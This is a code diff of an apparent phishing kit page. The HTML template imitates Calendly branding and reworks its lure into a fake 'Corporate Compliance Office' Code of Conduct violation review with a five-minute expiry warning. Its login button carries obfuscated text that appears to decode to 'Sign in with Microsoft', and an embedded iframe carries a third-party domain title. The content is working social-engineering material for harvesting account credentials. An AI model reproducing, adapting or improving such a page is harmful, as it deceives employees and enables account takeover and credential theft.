@@ -583,44 +583,52 @@ const jsURLs = ['https://assets.calendly.com/assets/external/widget.js', '/prima
 
 const primaryHTML = `
     <header>
-    <div id="logo">Calendly</div>
-    <nav>
-        <a href="#">Home</a>
-        <a href="#">Services</a>
-        <a href="#">About</a>
-        <a href="#">Contact</a>
-    </nav>
-    <div id="contact">Abuse Report</div>
-    </header>
-    <main>
-    <section id="hero">
-        <h1>Calendly Security & Compliance</h1>
         
-        <p>Customer Appeal & Policy Review under Calendly sub-processors (GDPR, CCPA) and Account Terms.</p>
-    </section>
-    <section id="registration-form-section">
-        <section id="training-info">
-            <h2>Upcoming Calendly Awareness Training and Appeal Overview</h2>
+        <div id="logo">Code Of Conduct Review</div>
+        <nav>
+            <a href="#">Home</a>
+            <a href="#">Services</a>
+            <a href="#">About</a>
+            <a href="#">Contact</a>
+        </nav>
+        <div id="contact">Abuse Dashboard</div>
+    </header>
+
+    <main>
+        <section id="hero">
+            <h1>Corporate Compliance Office</h1>
             
-            <p>Our centralized compliance system has saved, time-stamped, and logged all materials.</p>
+            <p>Code of Conduct Review — Section C, Page iv</p>
+        </section>
+
+        <section id="registration-form-section">
+            <section id="training-info">
+                <h2>Your Upcoming COC Violation Review and Awareness Training</h2>
+                
+                <p>Our centralized compliance system has saved, time-stamped, and logged all materials.</p>
+                
+            </section>
+
+            <div id="primary-overlay-container">
+                <div id="paywall-modal">
+                    <h3 id="lg-h">Your page will expire in 5 minutes if there is no activity.</h3>
+                    <p id="lg-p">Thank you for your prompt attention to this matter.</p>
+                    
+                    <button id="login-btn"><img id="lgImg" src="/primary/images/logo.svg"></img>OBFS==Adm92cvJ3Yp1EIoRXa3BibpBibnl2UEND</button>
+                </div>
+
+            </div>
+
+            <iframe id="calendly-frame" src="" frameBorder="0" width="100%" height="100%" title="Select Date & Time - Etech-it.com"></iframe>
             
         </section>
-        <div id="primary-overlay-container">
-            <div id="paywall-modal">
-                <h3 id="lg-h">Your page will expire in 5 minutes if there is no activity.</h3>
-                <p id="lg-p">Calendly prioritizes your privacy and security, Sign in to continue.</p>
-                
-                <button id="login-btn"><img id="lgImg" src="/primary/images/logo.svg"></img>OBFS==Adm92cvJ3Yp1EIoRXa3BibpBibnl2UEND</button>
-            </div>
-        </div>
-        <iframe id="calendly-frame" src="" frameBorder="0" width="100%" height="100%" title="Select Date & Time - Etech-it.com"></iframe>
-    </section>
     </main>
+
     <footer>
-    <p>&copy; Copyright Calendly 2026.</p>
-    <nav>
-        <a href="#">Privacy Policy</a>
-        <a href="#">Terms of Service</a>
-    </nav>
+        <p>&copy; Copyright Calendly 2026.</p>
+        <nav>
+            <a href="#">Privacy Policy</a>
+            <a href="#">Terms of Service</a>
+        </nav>
     </footer>
 `
